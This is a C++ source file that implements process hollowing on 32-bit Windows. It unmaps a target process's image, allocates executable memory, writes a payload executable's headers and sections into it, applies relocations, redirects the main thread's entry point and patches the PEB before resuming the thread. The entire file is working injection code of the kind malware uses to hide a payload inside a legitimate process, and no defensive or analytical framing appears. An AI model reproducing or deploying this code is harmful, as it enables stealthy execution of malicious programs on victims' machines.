#include "Hollowing32Bit.hpp"
#include "NtdllFunctions.hpp"
#include <Windows.h>
#include <string>
#include <Ntsecapi.h>
#include <DbgHelp.h>
#include <stdint.h>
#include <iostream>

Hollowing32Bit::Hollowing32Bit(const std::string& targetPath, const std::string& payloadPath) :
    HollowingFunctions(targetPath, payloadPath)
{
    if (!AreProcessesCompatible())
    {
        std::cout << "The processes are incompatible!" << std::endl;
        throw ""; // Replace with an exception class
    }
}

void Hollowing32Bit::hollow()
{
    std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl;

    PEB32 targetPEB = Read32BitProcessPEB(_targetProcessInformation.hProcess);

    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS32 payloadNTHeaders = *((PIMAGE_NT_HEADERS32)(_payloadBuffer + payloadDOSHeader.e_lfanew));

    std::cout << "SectionAlignment: " << std::hex << payloadNTHeaders.OptionalHeader.SectionAlignment << std::endl;

    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress))
    {
        std::cout << "206" << std::endl;
        // Exception
    }
    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress,
        payloadNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (nullptr == targetNewBaseAddress)
    {
        std::cout << "202 Error Code: " << GetLastError() << std::endl;
    }

    std::cout << "New base address: " << std::hex << targetNewBaseAddress << std::endl;

    WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);

    UpdateTargetProcessEntryPoint(((LPBYTE)targetNewBaseAddress + payloadNTHeaders.OptionalHeader.AddressOfEntryPoint));

    DWORD delta = (intptr_t)targetNewBaseAddress - payloadNTHeaders.OptionalHeader.ImageBase;
    std::cout << "Delta: " << std::hex << delta << std::endl;
    if (0 != delta)
    {
        RelocateTargetProcess(delta, targetNewBaseAddress);
        
        UpdateBaseAddressInTargetPEB(targetNewBaseAddress);
    }


    std::cout << "Resuming the target's main thread" << std::endl;
    
    NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);
}

void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
{
    IMAGE_DOS_HEADER sourceDOSHeader = *((PIMAGE_DOS_HEADER)sourceFileContents);
    IMAGE_NT_HEADERS32 sourceNTHeaders = *((PIMAGE_NT_HEADERS32)(sourceFileContents + sourceDOSHeader.e_lfanew));

    sourceNTHeaders.OptionalHeader.ImageBase = (intptr_t)targetBaseAddress;

    CopyMemory(sourceFileContents + sourceDOSHeader.e_lfanew, &sourceNTHeaders, sizeof(sourceNTHeaders));
    
    std::cout << "Writing headers" << std::endl;
    DWORD oldProtection = 0;
    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
        sourceNTHeaders.OptionalHeader.SizeOfHeaders, &writtenBytes) || writtenBytes != sourceNTHeaders.OptionalHeader.SizeOfHeaders)
    {
        std::cout << "213" << std::endl;
    }
    if (0 == writtenBytes)
    {
        std::cout << "130" << std::endl;
    }
    VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
        PAGE_READONLY, &oldProtection);

    for (int i = 0; i < sourceNTHeaders.FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSection = (PIMAGE_SECTION_HEADER)(sourceFileContents + sourceDOSHeader.e_lfanew +
            sizeof(IMAGE_NT_HEADERS32) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        printf("Writing %s\n", currentSection->Name);
        NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (PVOID)((LPBYTE)targetBaseAddress +
            currentSection->VirtualAddress), (PVOID)(sourceFileContents + currentSection->PointerToRawData),
            currentSection->SizeOfRawData, nullptr);

        VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
    }
}

void Hollowing32Bit::UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress)
{
    WOW64_CONTEXT threadContext;
    threadContext.ContextFlags = WOW64_CONTEXT_ALL;

    if (0 == Wow64GetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        std::cout << "184" << std::endl;
        // Exception
    }

    threadContext.Eax = (intptr_t)newEntryPointAddress;

    if (0 == Wow64SetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        std::cout << "179" << std::endl;
    }
}

PIMAGE_DATA_DIRECTORY Hollowing32Bit::GetPayloadDirectoryEntry(DWORD directoryID)
{
    PIMAGE_DOS_HEADER payloadDOSHeader = (PIMAGE_DOS_HEADER)_payloadBuffer;
    PIMAGE_NT_HEADERS32 payloadNTHeaders = (PIMAGE_NT_HEADERS32)(_payloadBuffer + payloadDOSHeader->e_lfanew);

    return &(payloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
}

PIMAGE_SECTION_HEADER Hollowing32Bit::FindTargetProcessSection(const std::string& sectionName)
{
    IMAGE_DOS_HEADER payloadDOSHeader = *((PIMAGE_DOS_HEADER)_payloadBuffer);
    IMAGE_NT_HEADERS32 payloadNTHeaders = *((PIMAGE_NT_HEADERS32)(_payloadBuffer + payloadDOSHeader.e_lfanew));
    BYTE maxNameLengthHolder[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };  // According to WinAPI, the name of the section can
                                                                    // be as long as the size of the buffer, which means
                                                                    // it won't always have a terminating null byte, so
                                                                    // we include a spot for one at the end by ourselves.
    int i = 0;

    for (i = 0; i < payloadNTHeaders.FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)(_payloadBuffer + payloadDOSHeader.e_lfanew +
            sizeof(IMAGE_NT_HEADERS32) + (i * sizeof(IMAGE_SECTION_HEADER)));

        if (0 != currentSectionHeader->Name[IMAGE_SIZEOF_SHORT_NAME - 1])
        {
            strncpy((char*)maxNameLengthHolder, (char*)currentSectionHeader->Name, IMAGE_SIZEOF_SHORT_NAME);
        }
        else
        {
            int nameLength = strlen((char*)currentSectionHeader->Name);
            strncpy((char*)maxNameLengthHolder, (char*)currentSectionHeader->Name, nameLength);
            maxNameLengthHolder[nameLength] = 0;
        }

        if (0 == strcmp(sectionName.c_str(), (char*)maxNameLengthHolder))
        {
            return currentSectionHeader;
        }
    }

    return nullptr;
    // Exception
}

void Hollowing32Bit::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
{
    PIMAGE_DATA_DIRECTORY relocData = GetPayloadDirectoryEntry(IMAGE_DIRECTORY_ENTRY_BASERELOC);
    DWORD dwOffset = 0;
    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(".reloc");
    DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;
    printf("249 Header name: %s\n", relocSectionHeader->Name);

    while (dwOffset < relocData->Size)
    {
        PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&_payloadBuffer[dwRelocAddr + dwOffset];
        DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
        PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&_payloadBuffer[dwRelocAddr + dwOffset + sizeof(BASE_RELOCATION_BLOCK)];

        ProcessTargetRelocationBlock(pBlockHeader, pBlocks, processBaseAddress, baseAddressesDelta);

        dwOffset += pBlockHeader->BlockSize;
    }
}

void Hollowing32Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRelocationBlock, PBASE_RELOCATION_ENTRY blockEntries,
    PVOID processBaseAddress, ULONGLONG baseAddressesDelta)
{
    DWORD entriesAmount = CountRelocationEntries(baseRelocationBlock->BlockSize);

    for (DWORD i = 0; i < entriesAmount; i++)
    {
        if (0 != blockEntries[i].Type)
        {
            DWORD dwFieldAddress = baseRelocationBlock->PageAddress + blockEntries[i].Offset;
            DWORD dwBuffer = 0;
            SIZE_T readBytes = 0;
            if(0 == ReadProcessMemory(_targetProcessInformation.hProcess, (PVOID)((intptr_t)processBaseAddress + dwFieldAddress),
                &dwBuffer, sizeof(dwBuffer), &readBytes) || sizeof(dwBuffer) != readBytes)
            {
                std::cout << "264 Error Code:" << GetLastError() << std::endl;
            }
            
            dwBuffer += (DWORD)baseAddressesDelta;

            SIZE_T writtenBytes = 0;
            if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (PVOID)((intptr_t)processBaseAddress + dwFieldAddress),
                &dwBuffer, sizeof(dwBuffer), &writtenBytes) || sizeof(dwBuffer) != writtenBytes)
            {
                std::cout << "265 Error Code: " << GetLastError() << std::endl;
            }
        }
    }
}

void Hollowing32Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
{
    WOW64_CONTEXT threadContext;
    threadContext.ContextFlags = WOW64_CONTEXT_ALL;

    if (0 == Wow64GetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        std::cout << "184" << std::endl;
        // Exception
    }

    SIZE_T writtenBytes = 0;
    std::cout << "Offset: " << offsetof(PEB32, ImageBaseAddress) << std::endl;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (PVOID)(threadContext.Ebx + offsetof(PEB32, ImageBaseAddress)), &processNewBaseAddress, sizeof(DWORD), &writtenBytes) || sizeof(DWORD) != writtenBytes)
    {
        std::cout << "303" << std::endl;
    }
}

ULONG Hollowing32Bit::GetProcessSubsystem(HANDLE process)
{
    PEB32 processPEB = Read32BitProcessPEB(process);
    
    return processPEB.ImageSubsystem;
}

WORD Hollowing32Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(fileBuffer + dosHeader->e_lfanew);
    
    return ntHeaders->OptionalHeader.Subsystem;
}

bool Hollowing32Bit::AreProcessesCompatible()
{
    WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);

    return (!_isTarget64Bit && !_isPayload64Bit) && ((IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem) ||
        (payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)));
}